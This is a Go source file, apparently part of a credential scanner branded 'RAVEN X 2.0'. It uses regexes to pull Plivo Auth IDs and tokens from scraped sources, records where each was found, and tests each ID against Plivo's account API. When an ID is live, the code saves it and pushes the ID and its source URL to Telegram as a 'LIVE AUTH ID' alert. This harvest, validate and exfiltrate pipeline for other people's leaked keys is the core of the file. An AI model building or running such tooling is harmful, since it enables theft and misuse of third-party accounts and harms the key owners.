package main

import (
	"fmt"
	"net/http"
	"regexp"
)

// Plivo Auth ID: [MS]A prefix + 18 uppercase alphanum chars (20 total).
// Auth Token: 40-char [A-Za-z0-9_-] string — captured by plivoTokenPattern.
// Case-insensitive flag scoped to keyword only to avoid matching lowercase Auth IDs.
var plivoPattern = regexp.MustCompile(`(?i:plivo[_-]?(?:auth[_-]?)?(?:id|sid))["'\s:=]+([MS]A[A-Z0-9]{18})`)
var plivoTokenPattern = regexp.MustCompile(`(?i:plivo[_-]?(?:auth[_-]?)?(?:token|secret|key))["'\s:=]+([A-Za-z0-9_-]{40})`)

// CheckPlivo validates a Plivo Auth ID by hitting the account endpoint.
// KNOWN LIMITATION: Plivo requires Basic auth as AuthID:AuthToken, but the
// scanner only extracts the Auth ID (the AuthToken is a separate 40-char value
// that requires dual-credential context matching, like Twilio). We pass key:key
// as a best-effort probe; Plivo returns 401 for wrong passwords, so any 200
// response would be extraordinary — treat valid results with caution until
// dual-credential extraction is implemented.
func (a *AWSScanner) CheckPlivo(key, sourceURL string) bool {
	if !a.Config.APIValidation.Plivo {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()
	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "plivo_found.txt")

	url := "https://api.plivo.com/v1/Account/" + key + "/"
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	req.SetBasicAuth(key, key)
	req.Header.Set("Accept", "application/json")

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Plivo", fmt.Sprintf("Auth ID: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_plivo.txt")
		a.storeValidKeyLimit("Plivo", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📞 <b>PLIVO LIVE AUTH ID</b>

🔑 <b>Auth ID:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}
